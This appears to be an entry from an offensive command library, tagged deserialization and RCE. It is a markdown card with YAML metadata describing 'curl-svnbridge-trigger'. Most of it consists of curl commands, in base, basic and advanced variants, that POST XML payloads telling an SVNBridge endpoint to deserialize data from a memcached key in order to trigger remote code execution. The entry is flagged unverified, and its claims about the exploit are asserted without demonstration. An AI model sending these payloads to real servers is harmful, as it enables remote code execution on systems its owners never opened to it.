---
id: cmd-uuid-2345
data: >-
  curl -X POST 'https://target/svnbridge/endpoint' -d
  '<op><source>memcached://key</source></op>' -H 'Content-Type: application/xml'
tags:
  - deserialization
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.094Z'
verified: false
validated: true
submitted: true
---
# curl-svnbridge-trigger

## Command

```bash
curl -X POST 'https://target/svnbridge/endpoint' -d '<op><source>memcached://key</source></op>' -H 'Content-Type: application/xml'
```

## Description

This command sends an XML payload to the SVNBridge endpoint, directing it to deserialize data from a memcached source, triggering RCE if malicious.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d '<op>...' ` | XML with memcached source | Yes |
| `-H 'Content-Type: application/xml'` | Sets XML content type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target/svnbridge/op' -d '<svn><data>memcached://test</data></svn>' -H 'Content-Type: application/xml'
```

### Advanced Usage

```bash
curl -X POST 'https://target/svnbridge/deserialize' -d '<svn-op><source>memcached://malicious-key</source></svn-op>' -H 'Content-Type: application/xml' -v
```

## Expected Output

Server response with potential RCE output or error; verbose (-v) shows connection details.

## Related

- [[Related Procedure|Triggering-Deserialization-RCE-in-SVNBridge]]
